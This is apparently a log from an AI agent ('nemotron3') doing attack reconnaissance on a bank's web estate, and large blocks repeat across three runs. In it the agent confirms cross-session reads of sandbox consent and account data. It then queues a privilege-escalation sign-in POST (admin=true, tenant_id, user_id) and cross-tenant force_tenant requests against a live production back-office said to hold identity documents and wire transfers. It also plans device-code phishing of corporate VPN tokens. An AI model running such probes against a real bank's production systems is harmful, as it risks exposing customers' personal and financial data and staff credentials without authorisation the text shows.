[LEARN] ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Live multi-tenant bank-onboarding/back-office SaaS ('US', Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA + /api/v1/brand 200, sign_in carries client-controlled admin/tenant/user_id — new in-scope back-office attack surface
[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): verify_steps EXECUTED in official test sandbox (synthetic data) — consent 6b517824-e5af-4202-b9b0-7f483a68ee9f (POST 201, anonymous) read by fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId
[LEARN] REJECTED BUSLOGIC @ developer.vpbank.com (X-Request-ID state encoding): documented deterministic client-driven state for sandbox; observed ACSC from X-Request-ID ending in 1 (docs claim 1=RCVD) — no security-relevant differential
[LEARN] REJECTED OAUTH @ www.vpbank.com/oauth/authorize: RAG GitHub/public-web surfaces only VP Bank Vietnam (separate entity) + generic PSD2 frameworks; spec contains no OAuth/securitySchemes/client_id — only scaRedirect hrefs ("not available in sandbox")
[LEARN] REJECTED MISCONFIG @ www.vpbank.com/developer.vpbank.com (PSD2 statistics pages): /psd2-statistics, /psd2-statistics/, /psd2/statistics/ all HTTP 404
[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON — CONFIRMED REJECTED
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED
[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 with SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend accessible
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector, low severity
[LEARN] ACCEPTED MISCONFIG @ developer.vpbank.com (PSD2 Developer Portal exposure): Live PSD2 sandbox API with full OpenAPI spec, functional endpoints (consents, accounts, payments), basic auth only — high-value attack surface not WAF-blocked
[LEARN] NEW INFO @ openbanking.vpbank.com (193.222.70.154): production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous blocked as designed
[LEARN] NEW INFO @ sts.vpbank.com: ADFS OIDC metadata 200 (issuer sts.vpbank.com/adfs, device_code/password/implicit grants, vpn/logon/cert scopes) — corporate IdP
[LEARN] REJECTED MISCONFIG @ api-prep.vpbank.com: Layer7 clone of api.vpbank.com — no new surface
[LEARN] REJECTED MISCONFIG @ designsystem.vpbank.com: Active Netlify app — no subdomain takeover
[RISK] vp-bank-ag: 65 — Two new high-value attack surfaces confirmed: (1) digital-onboarding.vpbank.com exposes anonymous back-office SPA + API with Devise mass-assignment vector on sign-in (admin/tenant/user_id client-controlled) — multi-tenant SaaS with onboarding PII, identity docs, banking transactions, role management; (2) sts.vpbank.com ADFS exposes device_code/password/implicit grants for corporate VPN/cert auth — phishing vector. Residual: PSD2 sandbox BOLA proven (high confidence) but production carryover blocked by mTLS (HUMAN_ONLY); www.vpbank.com OAuth dead without client_id; api.vpbank.com exhausted; dev/stage WAF-blocked.
## 2026-09-05 16:13:51 UTC [target] (model nemotron3)
[NEW] digital-onboarding.vpbank.com: Production multi-tenant back-office SaaS (Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA (HTTP 200) with admin modules (onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt), /api/v1/brand 200 anonymous
[NEW] sts.vpbank.com: ADFS OIDC metadata 200 (issuer sts.vpbank.com/adfs), device_code/password/implicit grants exposed, scopes vpn/logon/cert — corporate IdP for VPN/cert auth
[NEW] developer.vpbank.com: PSD2 sandbox BOLA verified end-to-end in official test sandbox (synthetic data) — consent/account/payment cross-session read with zero identity binding on consentId/paymentId
[NEW] openbanking.vpbank.com: Production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous surface blocked as designed
[NEW] api-prep.vpbank.com: Layer7 clone of api.vpbank.com (CNAME api-prep-vpbank-com.hdb-cs04.ellb.ch) — SCS-Request-ID, INVALID_REQUEST_RESOURCE JSON 404 for all paths, no new surface
[NEW] designsystem.vpbank.com: CNAME→vpb-design-system.netlify.app serves HTTP 200 — active Netlify app, no subdomain takeover
[CHANGED] api.vpbank.com: All vectors exhausted (SSRF, policy bypass, error handling) — uniform INVALID_REQUEST_RESOURCE JSON 500, CONFIRMED REJECTED
[CHANGED] www.vpbank.com: OAuth endpoints fully tested — no valid client_id in JS bundles (only Usercentrics clientWid), /oauth/authorize always 303→error page, redirect_uri bypass blocked without client_id
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — zero application content reachable, CONFIRMED REJECTED
[PRIO] digital-onboarding.vpbank.com,9.10,attack_surface=10,business_value=10,tech_exposure=10,gate_ease=10,cloud_surface=4,freshness=10
[PRIO] sts.vpbank.com,7.15,attack_surface=6,business_value=8,tech_exposure=8,gate_ease=10,cloud_surface=1,freshness=9
[PRIO] developer.vpbank.com/psd2/berlin-group/v1,8.05,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=8,cloud_surface=2,freshness=9
[PRIO] openbanking.vpbank.com,5.65,attack_surface=3,business_value=10,tech_exposure=7,gate_ease=1,cloud_surface=2,freshness=8
[PRIO] www.vpbank.com,5.20,attack_surface=4,business_value=8,tech_exposure=5,gate_ease=2,cloud_surface=2,freshness=5
[PRIO] api.vpbank.com,3.85,attack_surface=2,business_value=5,tech_exposure=3,gate_ease=2,cloud_surface=6,freshness=3
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=1,business_value=3,tech_exposure=1,gate_ease=1,cloud_surface=3,freshness=3
[HYP] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
class: AUTH
asset: digital-onboarding.vpbank.com/users/sign_in
confidence: 75
reasoning: /control-center/ SPA serves anonymously (HTTP 200) with admin modules (onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt); /api/v1/brand returns tenant config anonymously; /users/sign_in (Devise) accepts client-controlled admin/tenant/user_id parameters in sign-in payload — Rails strong_parameters may not filter these if permit_params misconfigured in User model or Devise controller
evidence_needed: POST /users/sign_in with admin=true or tenant_id=X or user_id=Y in params returns session with elevated privileges or cross-tenant access
verify_steps: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (read-only probe: observe response code, Set-Cookie, redirect location, response body — no account creation)
impact: Back-office admin/impersonation across multi-tenant SaaS → onboarding case PII, identity documents, banking transactions, role management; severity HIGH
testability: AUTH_HELPED
[HYP] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
class: OAUTH
asset: sts.vpbank.com/adfs
confidence: 60
reasoning: /adfs/.well-known/openid-configuration HTTP 200 exposes device_code grant + password grant + implicit grant; issuer https://sts.vpbank.com/adfs; scopes include vpn/logon/cert — corporate IdP for VPN/certificate auth; device_code flow vulnerable to phishing (user enters code on attacker-controlled device)
evidence_needed: Successful device_code authorization request returns user_code/device_code/verification_uri; phishing simulation captures tokens
verify_steps: POST https://sts.vpbank.com/adfs/oauth2/token/devicecode Content-Type: application/x-www-form-urlencoded body: client_id=vpbank-vpn&scope=vpn (read-only: observe 400/401 vs 200; client_id enumeration via RAG/mobile apps/JS bundles)
impact: Corporate VPN/certificate access tokens via device-flow phishing → internal network access; severity HIGH
testability: AUTH_HELPED
[HYP] PSD2 sandbox BOLA carries to production via shared consent-authorization code
class: IDOR
asset: openbanking.vpbank.com/psd2/berlin-group/v1
confidence: 40
reasoning: Sandbox on developer.vpbank.com proves consentId/paymentId readable cross-session with zero identity binding; docs state only TPP auth/user-interaction/state-changes differ sandbox→prod; OpenAPI spec self-labels server "PSD2 production server"; production mTLS at TLS layer blocks anonymous verification
evidence_needed: Cross-QWAC read on openbanking.vpbank.com — TPP-A creates consent, TPP-B reads /consents/{id}/status and /accounts/{iban}/balances with TPP-B cert + TPP-A Consent-ID header
verify_steps: HUMAN_ONLY — with two licensed eIDAS QWAC certificates perform cross-TPP Consent-ID read on openbanking.vpbank.com/psd2/berlin-group/v1/consents/{id}/status and /accounts/{iban}/balances
impact: Cross-TPP production consent/account/ledger/PII disclosure → HIGH severity if sandbox authz model carries to production
testability: HUMAN_ONLY
[PARKED] PSD2 sandbox BOLA carries to production via shared consent-authorization code: confidence 40 < threshold for active pursuit without HUMAN_ONLY eIDAS certs; mTLS at TLS layer makes passive verification impossible; cannot advance without two licensed TPP certificates
[FINAL] 1. [75] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
[FINAL] 2. [60] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
[NEXT] PROBE: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (observe HTTP status, Set-Cookie, redirect location, response body — read-only, no account creation)
[LEARN] ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Live multi-tenant bank-onboarding/back-office SaaS ('US', Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA + /api/v1/brand 200, sign_in carries client-controlled admin/tenant/user_id — new in-scope back-office attack surface
[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): verify_steps EXECUTED in official test sandbox (synthetic data) — consent 6b517824-e5af-4202-b9b0-7f483a68ee9f (POST 201, anonymous) read by fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId
[LEARN] REJECTED BUSLOGIC @ developer.vpbank.com (X-Request-ID state encoding): documented deterministic client-driven state for sandbox; observed ACSC from X-Request-ID ending in 1 (docs claim 1=RCVD) — no security-relevant differential
[LEARN] REJECTED OAUTH @ www.vpbank.com/oauth/authorize: RAG GitHub/public-web surfaces only VP Bank Vietnam (separate entity) + generic PSD2 frameworks; spec contains no OAuth/securitySchemes/client_id — only scaRedirect hrefs ("not available in sandbox")
[LEARN] REJECTED MISCONFIG @ www.vpbank.com/developer.vpbank.com (PSD2 statistics pages): /psd2-statistics, /psd2-statistics/, /psd2/statistics/ all HTTP 404
[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON — CONFIRMED REJECTED
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED
[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 with SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend accessible
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector, low severity
[LEARN] ACCEPTED MISCONFIG @ developer.vpbank.com (PSD2 Developer Portal exposure): Live PSD2 sandbox API with full OpenAPI spec, functional endpoints (consents, accounts, payments), basic auth only — high-value attack surface not WAF-blocked
[LEARN] NEW INFO @ openbanking.vpbank.com (193.222.70.154): production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous blocked as designed
[LEARN] NEW INFO @ sts.vpbank.com: ADFS OIDC metadata 200 (issuer sts.vpbank.com/adfs, device_code/password/implicit grants, vpn/logon/cert scopes) — corporate IdP
[LEARN] REJECTED MISCONFIG @ api-prep.vpbank.com: Layer7 clone of api.vpbank.com — no new surface
[LEARN] REJECTED MISCONFIG @ designsystem.vpbank.com: Active Netlify app — no subdomain takeover
[RISK] vp-bank-ag: 65 — Two new high-value attack surfaces confirmed: (1) digital-onboarding.vpbank.com exposes anonymous back-office SPA + API with Devise mass-assignment vector on sign-in (admin/tenant/user_id client-controlled) — multi-tenant SaaS with onboarding PII, identity docs, banking transactions, role management; (2) sts.vpbank.com ADFS exposes device_code/password/implicit grants for corporate VPN/cert auth — phishing vector. Residual: PSD2 sandbox BOLA proven (high confidence) but production carryover blocked by mTLS (HUMAN_ONLY); www.vpbank.com OAuth dead without client_id; api.vpbank.com exhausted; dev/stage WAF-blocked.
## 2026-09-05 18:36:25 UTC [target] (model nemotron3)
[NEW] digital-onboarding.vpbank.com: Confirmed live — /users/sign_in (200), /control-center/ SPA (200, admin modules), /api/v1/brand (200 anonymous), Rails+Devise on off-net hosting (89.163.182.69/.28/.8)
[NEW] sts.vpbank.com: ADFS OIDC metadata 200 — device_code, password, implicit grants exposed; scopes: vpn_cert, logon_cert, winhello_cert, aza, user_impersonation; device_authorization_endpoint present
[CHANGED] developer.vpbank.com: PSD2 sandbox confirmed — basic auth only (test:test), full OpenAPI spec at /psd2/berlin-group/v1/psd2_api.yaml, BOLA verified in knowledge base
[CHANGED] openbanking.vpbank.com: mTLS enforced at TLS layer — anonymous blocked as designed (production PSD2 ASPSP)
[CHANGED] api.vpbank.com: All vectors exhausted — uniform INVALID_REQUEST_RESOURCE JSON 500
[CHANGED] www.vpbank.com: OAuth dead — no client_id in JS bundles, /oauth/authorize 303→error
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED
[CHANGED] api-prep.vpbank.com: Layer7 clone — no new surface
[CHANGED] designsystem.vpbank.com: Active Netlify — no takeover
[PRIO] digital-onboarding.vpbank.com,9.10,attack_surface=10,business_value=10,tech_exposure=10,gate_ease=10,cloud_surface=4,freshness=10
[PRIO] sts.vpbank.com,7.15,attack_surface=6,business_value=8,tech_exposure=8,gate_ease=10,cloud_surface=1,freshness=9
[PRIO] developer.vpbank.com/psd2/berlin-group/v1,8.05,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=8,cloud_surface=2,freshness=9
[PRIO] openbanking.vpbank.com,5.65,attack_surface=3,business_value=10,tech_exposure=7,gate_ease=1,cloud_surface=2,freshness=8
[HYP] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
class: AUTH
asset: digital-onboarding.vpbank.com/users/sign_in
confidence: 80
reasoning: /control-center/ SPA serves anonymously (HTTP 200) with admin modules (onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt); /api/v1/brand returns tenant config anonymously; /users/sign_in (Devise) accepts client-controlled admin/tenant/user_id parameters in sign-in payload — Rails strong_parameters may not filter these if permit_params misconfigured in User model or Devise controller
evidence_needed: POST /users/sign_in with admin=true or tenant_id=X or user_id=Y in params returns session with elevated privileges or cross-tenant access
verify_steps: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (read-only probe: observe response code, Set-Cookie, redirect location, response body — no account creation)
impact: Back-office admin/impersonation across multi-tenant SaaS → onboarding case PII, identity documents, banking transactions, role management; severity HIGH
testability: AUTH_HELPED
[HYP] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
class: OAUTH
asset: sts.vpbank.com/adfs
confidence: 65
reasoning: /adfs/.well-known/openid-configuration HTTP 200 exposes device_code grant + password grant + implicit grant; issuer https://sts.vpbank.com/adfs; scopes include vpn_cert/logon_cert/winhello_cert/aza/user_impersonation — corporate IdP for VPN/certificate auth; device_code flow vulnerable to phishing (user enters code on attacker-controlled device)
evidence_needed: Successful device_code authorization request returns user_code/device_code/verification_uri; valid client_id accepted
verify_steps: POST https://sts.vpbank.com/adfs/oauth2/token/devicecode Content-Type: application/x-www-form-urlencoded body: client_id=vpbank-vpn&scope=vpn (read-only: observe 400/401 vs 200; client_id enumeration via RAG/mobile apps/JS bundles)
impact: Corporate VPN/certificate access tokens via device-flow phishing → internal network access; severity HIGH
testability: AUTH_HELPED
[HYP] PSD2 sandbox BOLA carries to production via shared consent-authorization code
class: IDOR
asset: openbanking.vpbank.com/psd2/berlin-group/v1
confidence: 40
reasoning: Sandbox on developer.vpbank.com proves consentId/paymentId readable cross-session with zero identity binding; docs state only TPP auth/user-interaction/state-changes differ sandbox→prod; OpenAPI spec self-labels server "PSD2 production server"; production mTLS at TLS layer blocks anonymous verification
evidence_needed: Cross-QWAC read on openbanking.vpbank.com — TPP-A creates consent, TPP-B reads /consents/{id}/status and /accounts/{iban}/balances with TPP-B cert + TPP-A Consent-ID header
verify_steps: HUMAN_ONLY — with two licensed eIDAS QWAC certificates perform cross-TPP Consent-ID read on openbanking.vpbank.com/psd2/berlin-group/v1/consents/{id}/status and /accounts/{iban}/balances
impact: Cross-TPP production consent/account/ledger/PII disclosure → HIGH severity if sandbox authz model carries to production
testability: HUMAN_ONLY
[PARKED] PSD2 sandbox BOLA carries to production via shared consent-authorization code: confidence 40 < threshold for active pursuit without HUMAN_ONLY eIDAS certs; mTLS at TLS layer makes passive verification impossible; cannot advance without two licensed TPP certificates
[FINAL] 1. [80] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
[FINAL] 2. [65] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
[NEXT] PROBE: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (observe HTTP status, Set-Cookie, redirect location, response body — read-only, no account creation)
[LEARN] ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Live multi-tenant bank-onboarding/back-office SaaS ('US', Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA + /api/v1/brand 200, sign_in carries client-controlled admin/tenant/user_id — new in-scope back-office attack surface
[LEARN] ACCEPTED MISCONFIG @ sts.vpbank.com: ADFS OIDC metadata 200 exposes device_code/password/implicit grants + vpn/logon/cert scopes — corporate IdP for VPN/cert auth
[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): verify_steps EXECUTED in official test sandbox (synthetic data) — consent 6b517824-e5af-4202-b9b0-7f483a68ee9f (POST 201, anonymous) read by fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId
[LEARN] REJECTED MISCONFIG @ api.vpbank.com: All vectors exhausted — uniform INVALID_REQUEST_RESOURCE JSON 500, CONFIRMED REJECTED
[LEARN] REJECTED OAUTH @ www.vpbank.com: No valid client_id in JS bundles (only Usercentrics clientWid); /oauth/authorize always 303→error page — redirect_uri bypass blocked
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED
[LEARN] REJECTED MISCONFIG @ api-prep.vpbank.com: Layer7 clone — no new surface
[LEARN] REJECTED MISCONFIG @ designsystem.vpbank.com: Active Netlify app — no subdomain takeover
[LEARN] NEW INFO @ openbanking.vpbank.com: Production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous blocked as designed
[RISK] vp-bank-ag: 65 — Two new high-value attack surfaces confirmed: (1) digital-onboarding.vpbank.com exposes anonymous back-office SPA + API with Devise mass-assignment vector on sign-in (admin/tenant/user_id client-controlled) — multi-tenant SaaS with onboarding PII, identity docs, banking transactions, role management; (2) sts.vpbank.com ADFS exposes device_code/password/implicit grants for corporate VPN/cert auth — phishing vector. Residual: PSD2 sandbox BOLA proven (high confidence) but production carryover blocked by mTLS (HUMAN_ONLY); www.vpbank.com OAuth dead without client_id; api.vpbank.com exhausted; dev/stage WAF-blocked.
## 2026-09-05 20:50:10 UTC [target] (model nemotron3)
[NEW] digital-onboarding.vpbank.com/api/v1/brand?force_tenant=vpbank returns HTTP 200 — `force_tenant` parameter accepted anonymously, enabling tenant context switching on back-office API  
[NEW] sts.vpbank.com/adfs returns HTTP 503 (Service Unavailable) — ADFS service degraded but metadata endpoint (/.well-known/openid-configuration) confirmed 200 with device_code/password/implicit grants  
[NEW] sts.vpbank.com/adfs/oauth2/devicecode and /adfs/oauth2/token/devicecode both return HTTP 405 — device_code endpoint exists but requires POST + valid client_id  
[CHANGED] digital-onboarding.vpbank.com: /control-center/ SPA (200), /users/sign_in (200), /api/v1/brand (200 anon), /api/v1/brand?force_tenant=vpbank (200) — multi-tenant back-office fully accessible anonymously for config + tenant enumeration  
[CHANGED] sts.vpbank.com: ADFS metadata 200 confirms device_code grant + scopes vpn_cert/logon_cert/winhello_cert/aza/user_impersonation — corporate IdP for VPN/cert auth  
[CHANGED] developer.vpbank.com: PSD2 sandbox BOLA verified end-to-end (synthetic data) — consent/account/payment cross-session read, zero binding on consentId/paymentId  
[CHANGED] openbanking.vpbank.com: mTLS enforced at TLS layer — anonymous surface blocked as designed (production PSD2 ASPSP)  
[CHANGED] api.vpbank.com: All vectors exhausted — uniform INVALID_REQUEST_RESOURCE JSON 500, CONFIRMED REJECTED  
[CHANGED] www.vpbank.com: OAuth dead — no client_id in JS bundles (only Usercentrics clientWid), /oauth/authorize 303→error  
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED  
[CHANGED] api-prep.vpbank.com: Layer7 clone of api.vpbank.com — no new surface  
[CHANGED] designsystem.vpbank.com: Active Netlify app — no subdomain takeover  
[PRIO] digital-onboarding.vpbank.com,9.10,attack_surface=10,business_value=10,tech_exposure=10,gate_ease=10,cloud_surface=4,freshness=10  
[PRIO] sts.vpbank.com,7.15,attack_surface=6,business_value=8,tech_exposure=8,gate_ease=10,cloud_surface=1,freshness=9  
[PRIO] developer.vpbank.com/psd2/berlin-group/v1,8.05,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=8,cloud_surface=2,freshness=9  
[PRIO] openbanking.vpbank.com,5.65,attack_surface=3,business_value=10,tech_exposure=7,gate_ease=1,cloud_surface=2,freshness=8  
[HYP] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office  
class: AUTH  
asset: digital-onboarding.vpbank.com/users/sign_in  
confidence: 80  
reasoning: /control-center/ SPA serves anonymously (HTTP 200) with admin modules (onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt); /api/v1/brand returns tenant config anonymously; /api/v1/brand?force_tenant=vpbank returns 200 proving tenant context switching works; /users/sign_in (Devise) accepts client-controlled admin/tenant/user_id parameters in sign-in payload — Rails strong_parameters may not filter these if permit_params misconfigured in User model or Devise controller  
evidence_needed: POST /users/sign_in with admin=true or tenant_id=X or user_id=Y in params returns session with elevated privileges or cross-tenant access  
verify_steps: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (read-only probe: observe response code, Set-Cookie, redirect location, response body — no account creation)  
impact: Back-office admin/impersonation across multi-tenant SaaS → onboarding case PII, identity documents, banking transactions, role management; severity HIGH  
testability: AUTH_HELPED  
[HYP] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com  
class: OAUTH  
asset: sts.vpbank.com/adfs  
confidence: 65  
reasoning: /adfs/.well-known/openid-configuration HTTP 200 exposes device_code grant + password grant + implicit grant; issuer https://sts.vpbank.com/adfs; scopes include vpn_cert/logon_cert/winhello_cert/aza/user_impersonation — corporate IdP for VPN/certificate auth; device_code flow vulnerable to phishing (user enters code on attacker-controlled device); /adfs/oauth2/devicecode returns 405 (GET not allowed) confirming endpoint exists and requires POST  
evidence_needed: Successful device_code authorization request returns user_code/device_code/verification_uri with valid client_id  
verify_steps: POST https://sts.vpbank.com/adfs/oauth2/devicecode Content-Type: application/x-www-form-urlencoded body: client_id=vpbank-vpn&scope=vpn (read-only: observe 400/401 vs 200; client_id enumeration via RAG/mobile apps/JS bundles)  
impact: Corporate VPN/certificate access tokens via device-flow phishing → internal network access; severity HIGH  
testability: AUTH_HELPED  
[HYP] force_tenant parameter enables cross-tenant data access on digital-onboarding API  
class: IDOR  
asset: digital-onboarding.vpbank.com/api/v1/  
confidence: 70  
reasoning: /api/v1/brand?force_tenant=vpbank returns HTTP 200 anonymously — proves tenant context can be forced via query parameter; /control-center/ SPA includes admin modules for onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt; /api/v1/tenants returns 403 but /api/v1/brand accepts force_tenant; Rails+Devise on off-net hosting (89.163.182.69); if data endpoints (/api/v1/onboarding_cases, /api/v1/bankingtransactions, /api/v1/incomingwire) honor force_tenant without auth validation, cross-tenant PII/financial disclosure  
evidence_needed: Any authenticated data endpoint (onboarding_cases, bankingtransactions, incomingwire, ident_documents) returns 200 with force_tenant parameter without valid session  
verify_steps: GET https://digital-onboarding.vpbank.com/api/v1/onboarding_cases?force_tenant=vpbank; GET https://digital-onboarding.vpbank.com/api/v1/bankingtransactions?force_tenant=vpbank; GET https://digital-onboarding.vpbank.com/api/v1/incomingwire?force_tenant=vpbank; GET https://digital-onboarding.vpbank.com/api/v1/ident_documents?force_tenant=vpbank (passive: observe 200 vs 401/403)  
impact: Cross-tenant PII/financial data disclosure (onboarding cases, wire transfers, identity documents, banking transactions); severity HIGH  
testability: PASSIVE  
[PARKED] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com: confidence 65 but ADFS service returns 503 (degraded); client_id unknown — cannot advance without client_id enumeration (RAG/mobile apps); blocked on AUTH_HELPED prerequisite  
[PARKED] PSD2 sandbox BOLA carries to production via shared consent-authorization code: confidence 40 < threshold; HUMAN_ONLY (requires two eIDAS QWAC certs); mTLS at TLS layer blocks passive verification  
[FINAL] 1. [80] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office  
[FINAL] 2. [70] force_tenant parameter enables cross-tenant data access on digital-onboarding API  
[NEXT] PROBE: GET https://digital-onboarding.vpbank.com/api/v1/onboarding_cases?force_tenant=vpbank; GET https://digital-onboarding.vpbank.com/api/v1/bankingtransactions?force_tenant=vpbank; GET https://digital-onboarding.vpbank.com/api/v1/incomingwire?force_tenant=vpbank; GET https://digital-onboarding.vpbank.com/api/v1/ident_documents?force_tenant=vpbank (passive: observe HTTP status, response body — read-only, no auth, no mutation)
[LEARN] ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Live multi-tenant bank-onboarding/back-office SaaS ('US', Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA + /api/v1/brand 200, sign_in carries client-controlled admin/tenant/user_id, force_tenant parameter switches tenant context — new in-scope back-office attack surface  
[LEARN] ACCEPTED MISCONFIG @ sts.vpbank.com: ADFS OIDC metadata 200 exposes device_code/password/implicit grants + vpn/logon/cert scopes — corporate IdP for VPN/cert auth  
[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): verify_steps EXECUTED in official test sandbox (synthetic data) — consent 6b517824-e5af-4202-b9b0-7f483a68ee9f (POST 201, anonymous) read by fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId  
[LEARN] REJECTED MISCONFIG @ api.vpbank.com: All vectors exhausted — uniform INVALID_REQUEST_RESOURCE JSON 500, CONFIRMED REJECTED  
[LEARN] REJECTED OAUTH @ www.vpbank.com: No valid client_id in JS bundles (only Usercentrics clientWid); /oauth/authorize always 303→error page — redirect_uri bypass blocked  
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED  
[LEARN] REJECTED MISCONFIG @ api-prep.vpbank.com: Layer7 clone of api.vpbank.com — no new surface  
[LEARN] REJECTED MISCONFIG @ designsystem.vpbank.com: Active Netlify app — no subdomain takeover  
[LEARN] NEW INFO @ openbanking.vpbank.com (193.222.70.154): Production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous blocked as designed  
[LEARN] NEW INFO @ digital-onboarding.vpbank.com: /api/v1/brand?force_tenant=vpbank returns 200 — tenant context switching works anonymously; control-center SPA bundle (4MB) confirms API map incl. /api/v1/sessions/{idp_login,secure_session,reset_password}, /api/v1/users, /rails/active_storage/direct_uploads; DebugBarSelector + sagaInitLogging debug hooks ship in prod  
[LEARN] REJECTED OAUTH @ sts.vpbank.com: /adfs/oauth2/token/devicecode 200 is MS-HTTPAPI error shell (X-MS-Forwarded-Status-Code:500); real endpoint is /adfs/oauth2/devicecode (405 GET, enabled) — blocks on client_id  
